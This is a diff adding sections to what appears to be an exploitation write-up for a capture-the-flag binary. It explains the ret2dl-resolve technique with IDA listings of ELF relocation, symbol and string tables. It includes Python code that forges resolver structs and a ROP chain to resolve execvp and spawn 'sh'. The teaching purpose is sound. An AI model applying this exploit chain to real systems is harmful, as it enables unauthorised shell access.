@@ -161,7 +161,7 @@ The part of the function we need is:
 .text:0000000000400584 C3              retn
 ```
 
-But we Split it into two gadgets, the first starting at `0x400560` which
+But we split it into two gadgets, the first starting at `0x400560` which
 contains the function call, and the second one starts at `0x40057A`, this one
 we use to correctly setup the arguments needed for the call at `0x400569`.
 
@@ -188,11 +188,135 @@ chain_read += p64(CSU_CALL)
 chain_read += b"D"*8                    # to counter (add rsp,8) after call
 ```
 
-This will call `read` and we can pass our forged structs to it. After the 
+This will call `read` and we can pass our forged structs to it. After the
 read we continue and call the resolver.
 <br/>
 
 ___
 # Createing the Structs
 
-TODO
+This is the difficult part now, the resovler needs these structs to correctly
+resolve `execvp`. This works as follow (a short description as there is plenty
+of material online)
+
+A call to `read` calls into the `.plt` section:
+
+```
+.plt:00000000004003F0                    ; ssize_t read(int fd, void *buf, size_t nbytes)
+.plt:00000000004003F0 FF 25 22 0C 20 00  jmp     cs:off_601018
+.plt:00000000004003F6 68 00 00 00 00     push    0
+.plt:00000000004003FB E9 E0 FF FF FF     jmp     resolver_4003E0
+```
+
+The `jmp` at address `4003F0` jumps to the address stored at this location
+in the `GOT`. If `read` is already resolved it jumps directly to its implementation.
+If not, it jumps back to `4003F6`, pushes the zero on the stack which is the
+relocation argument. Defining at which offset in the `JMPREL Relocation Table`
+the `read` entry can be found. In this case it is zero meaning that `read` is
+the first entry.
+
+Verifing this in IDA (skipping the bytes):
+```
+LOAD:00000000004003B0   ; ELF JMPREL Relocation Table
+LOAD:00000000004003B0   Elf64_Rela <601018h, 100000007h, 0> ; R_X86_64_JUMP_SLOT read
+```
+
+Yes thats the case. The value in the `JMPRELentry` are the address on where to
+store the resolved address, the `rel_info` which defines the type of relocation
+and the offset in the symbol table. The index is calculated by shifting `rel_info`
+32 bits to the right, so in this case its `100000007h >> 32 = 1`. So its
+the second entry in the symbol table.
+
+Verifing this in IDA (skipping the bytes):
+```
+LOAD:00000000004002B8   ; ELF Symbol Table
+LOAD:00000000004002B8   Elf64_Sym <0>
+LOAD:00000000004002D0   Elf64_Sym <0Bh, 12h, 0, 0, 0, 0> ; "read"
+LOAD:00000000004002E8   Elf64_Sym <10h, 12h, 0, 0, 0, 0> ; "__libc_start_main"
+LOAD:0000000000400300   Elf64_Sym <2Eh, 20h, 0, 0, 0, 0> ; "__gmon_start__"
+```
+
+Yes looks good, the first entry is always zero by the way. The first entry here
+points to the offset in the string table. So the `read` string starts at offset
+11 in the `STRTAB`.
+
+Verifing this in IDA (skipping the bytes):
+```
+LOAD:0000000000400318   ; ELF String Table
+LOAD:0000000000400318   byte_400318     db 0
+LOAD:0000000000400319   aLibcSo6        db 'libc.so.6',0
+LOAD:0000000000400323   aRead           db 'read',0
+LOAD:0000000000400328   aLibcStartMain  db '__libc_start_main',0
+LOAD:000000000040033A   aGlibc225       db 'GLIBC_2.2.5',0
+LOAD:0000000000400346   aGmonStart      db '__gmon_start__',0
+```
+
+`0x23-0x18 = 11` and thats also matching. Nothing more is needed. We need
+to push the correct offset on the stack before calling the resolver. This
+offset has to point to the `bss` segment where our forged `JMPRELentry` lies.
+This entry has to contain valid parameters for the `GOT` offset, we reuse the
+one from read, and the `rel_info`. Where `rel_info` also has to point to the 
+`bss` segment to our forged symbol table entry. And last, in the symbol table
+entry we need a valid pointer to the `execvp` offset in the string table.
+
+This all is calculated as follows:
+```Python
+
+FORGED_AREA = C_AREA + 0x20                      # space for sh\x00 string
+
+# calculate relocation offset
+rel_offset = int((FORGED_AREA - JMPREL)/24)      # must be divideable with 0 rest
+elf64_sym_struct = FORGED_AREA + 0x28            # sym struct offset
+index_sym = int((elf64_sym_struct - SYMTAB)/24)  # calculate symbol table offset
+
+r_info = (index_sym << 32) | 0x7                 # 7 -> plt relocation type
+elf64_jmprel_struct  = p64(bin_elf.got['read'])  # just reuse read offset
+elf64_jmprel_struct += p64(r_info)
+elf64_jmprel_struct += p64(0)
+elf64_jmprel_struct += b"P"*16                   # padd to size 40 for second 24 division
+
+st_name = (elf64_sym_struct + 0x20) - STRTAB     # offset to "execvp"
+elf64_sym_struct = p64(st_name) + p64(0x12) + p64(0) + p64(0)
+
+# putting structs together
+chain_structs  = b"sh\x00"            # bin sh string as argument to resolver
+chain_structs += p64(0)               # for execvp argv pointer
+chain_structs += b"P"*21              # padding
+chain_structs += elf64_jmprel_struct  # forged jmprel entry struct
+chain_structs += elf64_sym_struct     # forged symbol table struct
+chain_structs += b"execvp\x00"        # function to resolve
+chain_structs += b"X"*17              # end of forged struct
+```
+
+It's important to note that all addresses have to be 24byte aligned, as those
+entries are 24bytes in size.
+<br/>
+
+___
+# Final Stage
+
+Now that we have all the pieces. The last step is to call the resolver and
+trigger the resolving of `excevp`. This is done using a simple `ROPchain`:
+
+```Python
+chain_read += p64(POP_RDI)              # set execvp file arg
+chain_read += p64(C_AREA)               # sh string
+chain_read += p64(POP_RSI_POP_R15_RET)  # empty args str
+chain_read += p64(C_AREA+2)             # null ptr arg to execvp
+chain_read += b"R"*8                    # dummy r15
+chain_read += p64(RESOLVER_ADDR)        # call resolver
+chain_read += p64(rel_offset)           # reloc_index arg
+chain_read += b"E"*16                   # end of chain
+```
+
+Of course before calling the resolver we have to setup the arguments for
+execvp, as the resolver calls it after successful resolving.
+
+The resolver works in two steps, first `_dl_runtime_resolve`
+([source](https://code.woboq.org/userspace/glibc/sysdeps/x86_64/dl-trampoline.h.html)) 
+is called which saves all the register on the stack and prepares the call to
+`_dl_fixup` ([source](https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html)).
+This function access the entries of our forged structs and calls `_dl_lookup_symbol_x`
+which is then resolving our function.
+
+
